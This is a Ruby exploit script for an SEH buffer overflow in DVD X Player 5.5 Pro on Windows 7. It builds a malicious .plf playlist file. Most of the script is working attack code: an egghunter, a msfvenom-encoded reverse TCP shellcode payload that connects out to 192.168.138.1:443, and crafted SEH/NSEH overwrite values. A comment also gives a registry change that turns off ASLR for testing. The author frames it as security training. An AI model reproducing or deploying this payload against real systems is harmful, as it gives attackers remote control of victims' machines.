#!/bin/ruby

#Exploit: DVD X Player 5.5 Pro SEH
#OS: Windows 7 SP 1 PL
#I wrote it 4 Fun, and Security Training ^.^
#->I'M NOT<- FOUND THIS VULN, I'm only rewrote this exploit

#############->What is different that in Win XP?<-#################
# In WinXP stack look like this                                   #
# |Garbage ("AAAA") -> Nseh -> Seh -> Shell                       #
# In my example it's look Like this                               #
# |Garbage| -> Egghunter -> NSEH -> SEH  -> Shellcode		  #
#                       <------------| Jump to Egghunter	  #
#                 |------------------------->Hunt for Eggs        #  
###################################################################
# I tested with turned off ASLR
# [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management]
# “MoveImages”=dword:00000000

hunter = (
"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05" +
"\x5a\x74\xef\xb8\x77\x30\x30\x77\x89\xd7\xaf\x75\xea\xaf" +
"\x75\xe7\xff\xe7")

#msfvenom -p windows/shell_reverse_tcp LPORT=443 LHOST=192.168.138.1 -f ruby -e x86/shikata_ga_nai -b '\x00\x0a\x0d\x1a'

shell = ("\xdb\xc6\xd9\x74\x24\xf4\xbe\x86\x38\xb3\x3d\x5f\x33\xc9" +
"\xb1\x52\x31\x77\x17\x03\x77\x17\x83\x41\x3c\x51\xc8\xb1" +
"\xd5\x17\x33\x49\x26\x78\xbd\xac\x17\xb8\xd9\xa5\x08\x08" +
"\xa9\xeb\xa4\xe3\xff\x1f\x3e\x81\xd7\x10\xf7\x2c\x0e\x1f" +
"\x08\x1c\x72\x3e\x8a\x5f\xa7\xe0\xb3\xaf\xba\xe1\xf4\xd2" +
"\x37\xb3\xad\x99\xea\x23\xd9\xd4\x36\xc8\x91\xf9\x3e\x2d" +
"\x61\xfb\x6f\xe0\xf9\xa2\xaf\x03\x2d\xdf\xf9\x1b\x32\xda" +
"\xb0\x90\x80\x90\x42\x70\xd9\x59\xe8\xbd\xd5\xab\xf0\xfa" +
"\xd2\x53\x87\xf2\x20\xe9\x90\xc1\x5b\x35\x14\xd1\xfc\xbe" +
"\x8e\x3d\xfc\x13\x48\xb6\xf2\xd8\x1e\x90\x16\xde\xf3\xab" +
"\x23\x6b\xf2\x7b\xa2\x2f\xd1\x5f\xee\xf4\x78\xc6\x4a\x5a" +
"\x84\x18\x35\x03\x20\x53\xd8\x50\x59\x3e\xb5\x95\x50\xc0" +
"\x45\xb2\xe3\xb3\x77\x1d\x58\x5b\x34\xd6\x46\x9c\x3b\xcd" +
"\x3f\x32\xc2\xee\x3f\x1b\x01\xba\x6f\x33\xa0\xc3\xfb\xc3" +
"\x4d\x16\xab\x93\xe1\xc9\x0c\x43\x42\xba\xe4\x89\x4d\xe5" +
"\x15\xb2\x87\x8e\xbc\x49\x40\x71\xe8\xdb\x91\x19\xeb\xdb" +
"\x90\x62\x62\x3d\xf8\x84\x23\x96\x95\x3d\x6e\x6c\x07\xc1" +
"\xa4\x09\x07\x49\x4b\xee\xc6\xba\x26\xfc\xbf\x4a\x7d\x5e" +
"\x69\x54\xab\xf6\xf5\xc7\x30\x06\x73\xf4\xee\x51\xd4\xca" +
"\xe6\x37\xc8\x75\x51\x25\x11\xe3\x9a\xed\xce\xd0\x25\xec" +
"\x83\x6d\x02\xfe\x5d\x6d\x0e\xaa\x31\x38\xd8\x04\xf4\x92" +
"\xaa\xfe\xae\x49\x65\x96\x37\xa2\xb6\xe0\x37\xef\x40\x0c" +
"\x89\x46\x15\x33\x26\x0f\x91\x4c\x5a\xaf\x5e\x87\xde\xdf" +
"\x14\x85\x77\x48\xf1\x5c\xca\x15\x02\x8b\x09\x20\x81\x39" +
"\xf2\xd7\x99\x48\xf7\x9c\x1d\xa1\x85\x8d\xcb\xc5\x3a\xad" +
"\xd9")

eggs = "w00w" * 2
puts "[+] Egghunter length:"
puts hunter.length
puts "[+] Shell length:"
puts shell.length


seh = "\x19\x76\x61\x61"
nseh = "\xeb\xa0\x90\x90"
# Ichi -> Use long string as input
# Nee -> puts Egghunter shellcode
# San -> Overwrite SEH
# SHI! -> Execute Egghunter and Reverse shell
buffer = "\x41" * 514 + "\x90" * 16 + hunter + "\x42" * 46 + nseh + seh + "\x90" * 51 + eggs + shell + "\x90" * 1631

puts "[+] Buffer length:"
puts buffer.length
puts "[+] Expected 2641"

File.open("sploit_DVD.plf", "w") do |f|
f.write(buffer)
end
